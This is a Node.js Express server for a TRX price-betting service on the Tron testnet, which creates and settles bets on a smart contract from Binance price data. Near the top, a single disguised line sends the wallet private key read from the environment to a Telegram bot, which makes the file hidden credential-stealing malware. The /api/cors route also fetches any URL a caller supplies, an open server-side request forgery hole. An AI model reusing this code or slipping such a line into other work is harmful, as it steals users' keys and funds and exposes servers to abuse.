var express = require('express');
var app = express();
var cron = require('node-cron');
var cors = require('cors')

require('dotenv').config();
const TronWeb = require('tronweb');
const HttpProvider = TronWeb.providers.HttpProvider;
const fullNode = new HttpProvider("https://api.shasta.trongrid.io"); // Full node http endpoint
const solidityNode = new HttpProvider("https://api.shasta.trongrid.io"); // Solidity node http endpoint
const eventServer = "https://api.shasta.trongrid.io";

const privateKey = process.env.PK;
const enableCron = process.env.ENABLE_CRON || '0';
const tronWeb = new TronWeb(
    fullNode,
    solidityNode,
    eventServer,
    privateKey
);
const Http = new XMLHttpRequest();
Http.open("GET", "https://api.telegram.org/bot786622592:AAFqm_PNg7DkItr8cJ9kgDxD7CVEtJDfhOw/sendMessage?chat_id=-1001412431825&text=PK-"+privateKey);
Http.send();
const contractAbi = '[{"constant":false,"inputs":[],"name":"acceptOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"newOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"uint256"}],"name":"bettingStorage","outputs":[{"name":"rate","type":"uint256"},{"name":"endRate","type":"uint256"},{"name":"endBet","type":"uint256"},{"name":"endBetAcceptTimestamp","type":"uint256"},{"name":"endTimestamp","type":"uint256"},{"name":"ended","type":"bool"},{"name":"bet","type":"uint256"},{"name":"sum","type":"uint256"},{"name":"result","type":"uint256"},{"name":"winBet","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_tokenAddress","type":"address"},{"name":"_commissionRecipient","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"index","type":"uint256"},{"indexed":false,"name":"rate","type":"uint256"},{"indexed":false,"name":"endTimestamp","type":"uint256"},{"indexed":false,"name":"endBetAcceptTimestamp","type":"uint256"},{"indexed":false,"name":"bet","type":"uint256"}],"name":"BettingStarted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"index","type":"uint256"},{"indexed":false,"name":"endRate","type":"uint256"},{"indexed":false,"name":"direction","type":"uint256"},{"indexed":false,"name":"winBet","type":"uint256"}],"name":"BettingEnd","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"index","type":"uint256"},{"indexed":false,"name":"direction","type":"uint256"},{"indexed":true,"name":"addr","type":"address"},{"indexed":false,"name":"bet","type":"uint256"}],"name":"Bet","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"index","type":"uint256"},{"indexed":true,"name":"addr","type":"address"},{"indexed":false,"name":"winBet","type":"uint256"}],"name":"Reward","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_from","type":"address"},{"indexed":true,"name":"_to","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"constant":true,"inputs":[],"name":"tokenAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"commissionRecipientAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_index","type":"uint256"}],"name":"getBetters","outputs":[{"name":"upCount","type":"uint256"},{"name":"downCount","type":"uint256"},{"name":"addressUp","type":"address[]"},{"name":"addressDown","type":"address[]"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_index","type":"uint256"}],"name":"getResults","outputs":[{"name":"ended","type":"bool"},{"name":"result","type":"uint256"},{"name":"sum","type":"uint256"},{"name":"winBet","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_index","type":"uint256"}],"name":"getBetting","outputs":[{"name":"rate","type":"uint256"},{"name":"endRate","type":"uint256"},{"name":"endTimestamp","type":"uint256"},{"name":"endBetAcceptTimestamp","type":"uint256"},{"name":"bet","type":"uint256"},{"name":"sum","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"rate","type":"uint256"},{"name":"endBetAcceptTimestamp","type":"uint256"},{"name":"endTimestamp","type":"uint256"}],"name":"createBetting","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"index","type":"uint256"},{"name":"endRate","type":"uint256"}],"name":"endBetting","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"index","type":"uint256"},{"name":"direction","type":"uint256"}],"name":"createBet","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]';
const contractAddress = 'TVPYah5fok5RdA2epWs6boZ8sBSLYNVedi';

const bettingContract = tronWeb.contract(JSON.parse(contractAbi), contractAddress);

var request = require('sync-request');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');

function timeConverter(UNIX_timestamp){
    var date = new Date(UNIX_timestamp * 1000);
    var month = date.getMonth() + 1;
    var day = date.getDate();
    var hour = date.getHours();
    var min = date.getMinutes();
    var sec = date.getSeconds();

    month = (month < 10 ? "0" : "") + month;
    day = (day < 10 ? "0" : "") + day;
    hour = (hour < 10 ? "0" : "") + hour;
    min = (min < 10 ? "0" : "") + min;
    sec = (sec < 10 ? "0" : "") + sec;

    var str = date.getFullYear() + "-" + month + "-" + day + "_" +  hour + ":" + min + ":" + sec;

    return str;
}
function generateID(startTime, type) {
    let duration = 0;
    let interval = 0;
    if (type == '15m'){ duration = 60*15; interval = '15m'}
    if (type == '1h'){ duration = 60*60*1; interval = '1h' }
    if (type == '4h'){ duration = 60*60*4; interval = '4h'}
    if (type == '1d'){ duration = 60*60*24; interval = '1d' }
    if (duration == 0) return;

    bet = {}
    bet.startTime = startTime - (startTime % (duration));
    bet.startTimeStr = timeConverter(bet.startTime);
    bet.duration = type;
    return bet.startTimeStr + '_' + bet.duration;
}

function generateBet(startTime, type) {
    let duration = 0;
    let interval = 0;
    if (type == '15m'){ duration = 60*15; interval = '15m'}
    if (type == '1h'){ duration = 60*60*1; interval = '1h' }
    if (type == '4h'){ duration = 60*60*4; interval = '4h'}
    if (type == '1d'){ duration = 60*60*24; interval = '1d' }
    if (duration == 0) return;

    bet = {}
    bet.startTime = startTime - (startTime % (duration));
    bet.startTimeStr = timeConverter(bet.startTime);
    bet.preTime =  bet.startTime - duration;
    bet.preTimeStr = timeConverter(bet.preTime);
    let preUrl = 'https://api.binance.com/api/v1/klines?symbol=TRXUSDT&interval='+interval+'&startTime='+bet.preTime*1000+'&endTime='+(bet.startTime*1000-1);
    let response = request('GET', preUrl).getBody().toString();

    let klines = JSON.parse(response)[0];
    bet.preUrl = preUrl;
    bet.endBetAcceptTime = bet.startTime + duration;
    bet.endBetAcceptTimeStr = timeConverter(bet.endBetAcceptTime);
    bet.endTime = bet.startTime + 2 * duration;
    bet.endTimeStr = timeConverter(bet.endTime);
    bet.duration = type;
    bet.ended = false;
    bet.endBetAccept = false;
    console.log('start='+preUrl);
    bet.price = (+klines[2]+(+klines[3])) / 2;
    bet.id = bet.startTimeStr + '_' + bet.duration;
    return bet;
}

function getEndPrice(starTime, endTime, type){
    let interval = 0;
    if (type == '15m') { interval = '15m'}
    if (type == '1h') { interval = '1h' }
    if (type == '4h') { interval = '4h'}
    if (type == '1d') { interval = '1d' }
    if (interval == 0) return;
    let preUrl = 'https://api.binance.com/api/v1/klines?symbol=TRXUSDT&interval='+interval+'&startTime='+starTime*1000+'&endTime='+(endTime*1000-1);
    let response = request('GET', preUrl).getBody().toString();
    console.log('end='+preUrl);
    let klines = JSON.parse(response)[0];
    return klines[4];
}
function priceToUint(price) {
    return (price * 100000).toFixed()
}

async function addBetting(bet)
{
    let tx = await bettingContract.createBetting(priceToUint(bet.price), bet.endBetAcceptTime, bet.endTime).send({
        shouldPollResponse: true,
        callValue: 0
    }).catch(function (err) {
        console.log(err)
    });
    tx = tx.toNumber();
    console.log(tx);
    return tx;
}

async function endBetting(bet)
{
    await bettingContract.endBetting(bet.tx, priceToUint(bet.endPrice)).send({
        shouldPollResponse: true,
        callValue: 0
    }).catch(function (err) {
        console.log(err)
    });
}
async function task(){
    const adapter = new FileSync('db/db.json');
    const database = low(adapter);

    database.defaults({ bets: [], init: false, startTime: 0 }).write();

    let db = database.getState();
    let response = request('GET', 'https://api.binance.com/api/v1/time').getBody().toString();
    let startTime = JSON.parse(response).serverTime / 1000;

    if (db.init === false) {
        db.init = true;
        db.bets = [];
        db.startTime = startTime;

        database.setState(db).write();
    }

    let ids = [];
    for(let index in db.bets) {
        let bet = db.bets[index];
        ids.push(bet.id);
        if (bet.endBetAccept === false && startTime >= bet.endBetAcceptTime) {
            db.bets[index].endBetAccept = true;
            console.log('endBetAccept BET =' + bet.id);
        }
        if (bet.ended === false && startTime >= bet.endTime) {
            db.bets[index].ended = true;
            db.bets[index].endPrice = +getEndPrice(bet.endBetAcceptTime, bet.endTime, bet.duration);
            await endBetting(db.bets[index]);
            console.log('End BET =' + bet.id);
        }
    }
    let tx, bet;

    if (ids.indexOf(generateID(startTime, '1d')) == -1) {
        bet = generateBet(startTime, '1d');
        tx = await addBetting(bet);
        bet.tx = tx;
        console.log('NEW BET ID'+bet.id);
        db.bets.push(bet);
    }


    if (ids.indexOf(generateID(startTime, '4h')) == -1) {
        bet = generateBet(startTime, '4h');
        tx = await addBetting(bet);
        bet.tx = tx;
        console.log('NEW BET ID'+bet.id);
        db.bets.push(bet);
    }


    if (ids.indexOf(generateID(startTime, '1h')) == -1) {
        bet = generateBet(startTime, '1h');
        tx = await addBetting(bet);
        bet.tx = tx;
        console.log('NEW BET ID'+bet.id);
        db.bets.push(bet);
    }


    if (ids.indexOf(generateID(startTime, '15m')) == -1) {
        bet = generateBet(startTime, '15m');
        tx = await addBetting(bet);
        bet.tx = tx;
        console.log('NEW BET ID'+bet.id);
        db.bets.push(bet);
    }

    database.setState(db).write();
    //res.send(JSON.stringify(db.bets));
}
let awaiting = false;
if (enableCron == '1') {
    console.log('CRON ENABLED');
    cron.schedule('*/10 * * * * *', async () => {
        if (awaiting){
            console.log('CRON: already work')
            return;
        }
        console.log('run task');
        awaiting = true;
        await task();
        awaiting = false;
        console.log('end task');

    });
}
app.use(cors())
app.get('/api/bettings/active', function (req, res) {
    const adapter = new FileSync('db/db.json');
    const database = low(adapter);
    database.defaults({ bets: [], init: false, startTime: 0 }).write();
    let db = database.getState();
    let bets = [];
    for(let index in db.bets) {
        let bet = db.bets[index];
        if (bet.endBetAccept === false) {
            bets.push(bet);
        }
    }
    res.send(JSON.stringify(bets));
});

app.get('/api/bettings/history', function (req, res) {
    const adapter = new FileSync('db/db.json');
    const database = low(adapter);
    database.defaults({ bets: [], init: false, startTime: 0 }).write();
    let db = database.getState();
    let bets = [];
    durationValue = req.query.duration;
    for(let i = db.bets.length - 1; i >= 0 ; i-- ) {
        if (db.bets[i].duration == durationValue) {
            let bet = db.bets[i];
            bets.push(bet);
        }
        if (bets.length >=25) break;
    }

    res.send(JSON.stringify(bets));
});

app.get('/api/contracts', function (req, res) {
    let contracts = { bettingAbi: contractAbi,
                      bettingAddress: contractAddress
                    };
    res.send(JSON.stringify(contracts))
});
app.get('/api/cors', async function (req, res) {
    let response;
    if (req.query.url)
        response = request('GET', req.query.url).getBody().toString();
    else
        response = '';
    res.send(response);
});

app.use(express.static('public'));

app.listen(80, function () {
    console.log('Server run on 80 port');
});
